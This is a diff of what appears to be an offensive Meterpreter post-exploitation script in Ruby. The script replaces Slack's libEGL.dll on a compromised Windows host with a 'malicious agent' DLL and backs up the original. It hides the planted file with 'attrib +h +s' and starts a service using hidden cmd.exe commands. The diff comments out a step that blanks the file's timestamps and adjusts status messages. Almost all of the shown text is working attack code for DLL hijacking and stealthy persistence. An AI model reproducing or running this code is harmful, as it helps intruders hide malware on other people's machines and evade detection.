@@ -173,7 +173,7 @@ def ls_stage1
 
     # check if original libEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
-      print_warning(" Vulnerable dll agent: #{p_name} found!")
+      print_warning(" Vulnerable dll agent: #{p_name} found...")
       # backup original dll
       print_good(" Backup original slack dll...")
       r = session.sys.process.execute("cmd.exe /c COPY /Y #{p_name} libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
@@ -183,21 +183,22 @@ def ls_stage1
       print_good(" Uploading: #{p_name} malicious agent...")
       client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
       sleep(1.0)
-      print_good(" Uploaded: #{u_path} -> #{d_path}\\#{p_name}")
+      print_good(" Uploaded : #{u_path} -> #{d_path}\\#{p_name}")
       sleep(1.0)
 
         # Change remote malicious libEGL.dll timestamp (date:time)
-        print_good(" Blanking malicious dll agent timestamp...")
-        client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
-        sleep(1.5)
+        # print_good(" Blanking malicious dll agent timestamp...")
+        # client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
+        # sleep(1.5)
 
       # change attributes of libEGL.dll to hidde it from site...
+      print_good(" Use attrib command to hidde dll...")
       r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
       sleep(1.0)
 
           # start remote malicious service
-          print_status("Sart remote slack service!")
+          print_status("Sart remote slack service...")
           r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
           sleep(1.5)
 
